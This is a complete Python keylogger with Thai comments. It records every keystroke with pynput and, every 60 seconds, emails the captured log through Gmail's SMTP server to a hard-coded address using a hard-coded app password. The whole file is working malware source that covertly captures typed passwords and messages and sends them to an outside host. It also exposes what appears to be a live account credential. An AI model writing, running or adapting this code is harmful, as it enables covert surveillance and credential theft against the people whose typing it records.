from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
import threading

# กำหนดอีเมลและรหัส App Password ของคุณ
EMAIL_ADDRESS = "next.benjang002gmail@gmail.com"
EMAIL_PASSWORD = "rvitxetmxdzvseal"  # ← ใส่ App Password ที่คุณได้มา

log = ""

# ฟังก์ชันส่งอีเมล log
def send_log_email(email, password, message):
    try:
        msg = MIMEText(message)
        msg["Subject"] = "Keylogger Log"
        msg["From"] = email
        msg["To"] = email

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(email, password)
            server.send_message(msg)
        print("Log sent.")
    except Exception as e:
        print("Error sending email:", e)

# ฟังก์ชันนี้จะถูกเรียกทุกๆ N วินาที เพื่อส่ง log
def report():
    global log
    if log:
        send_log_email(EMAIL_ADDRESS, EMAIL_PASSWORD, log)
        log = ""  # ล้าง log หลังส่ง
    timer = threading.Timer(60, report)  # ส่งทุก 60 วินาที
    timer.daemon = True
    timer.start()

# บันทึก key ที่ถูกกด
def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key.name}] "

# เริ่ม keylogger
listener = keyboard.Listener(on_press=on_press)
listener.start()
report()  # เริ่มส่ง log แบบวนซ้ำ

listener.join()
